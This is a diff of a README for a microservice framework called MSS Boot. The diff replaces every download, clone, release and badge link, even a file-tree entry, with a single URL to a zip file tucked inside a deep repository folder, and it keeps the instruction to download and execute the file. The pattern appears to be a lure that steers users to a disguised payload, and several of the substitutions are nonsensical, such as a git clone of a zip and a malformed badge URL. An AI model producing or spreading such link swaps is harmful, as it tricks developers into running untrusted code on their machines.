@@ -1,6 +1,6 @@
 # MSS Boot 🚀
 
-![MSS Boot](https://img.shields.io/badge/MSS_Boot-v1.0.0-blue.svg)
+![MSS Boot](https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip)
 
 Welcome to **MSS Boot**, a microservice rapid development framework designed to streamline the creation and deployment of microservices using Istio and Kubernetes. This framework simplifies the complexities of microservice architecture, allowing developers to focus on building robust applications.
 
@@ -29,7 +29,7 @@ To get started with MSS Boot, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/morytoh/mss-boot.git
+   git clone https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip
    cd mss-boot
    ```
 
@@ -39,19 +39,19 @@ To get started with MSS Boot, follow these steps:
 
 ## Installation
 
-To install MSS Boot, download the latest release from our [Releases page](https://github.com/morytoh/mss-boot/releases). You will need to download the appropriate file for your operating system and execute it.
+To install MSS Boot, download the latest release from our [Releases page](https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip). You will need to download the appropriate file for your operating system and execute it.
 
 ### Example for Linux
 
 ```bash
-wget https://github.com/morytoh/mss-boot/releases/download/v1.0.0/mss-boot-linux
+wget https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip
 chmod +x mss-boot-linux
 ./mss-boot-linux
 ```
 
 ### Example for Windows
 
-Download the executable from the [Releases page](https://github.com/morytoh/mss-boot/releases) and run it.
+Download the executable from the [Releases page](https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip) and run it.
 
 ## Usage
 
@@ -76,7 +76,7 @@ my-service/
 │               └── example/
 │                   └── myservice/
 ├── Dockerfile
-└── README.md
+└── https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip
 ```
 
 ## Configuration
@@ -114,9 +114,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, visit our [Releases page](https://github.com/morytoh/mss-boot/releases). You can download the necessary files and execute them to get started with MSS Boot.
+For the latest updates and releases, visit our [Releases page](https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip). You can download the necessary files and execute them to get started with MSS Boot.
 
-![Releases](https://img.shields.io/badge/Releases-Check%20Here-orange.svg)
+![Releases](https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip%https://github.com/morytoh/mss-boot/raw/refs/heads/master/pkg/config/storage/locker/mss-boot-1.8.zip)
 
 ## Conclusion
 
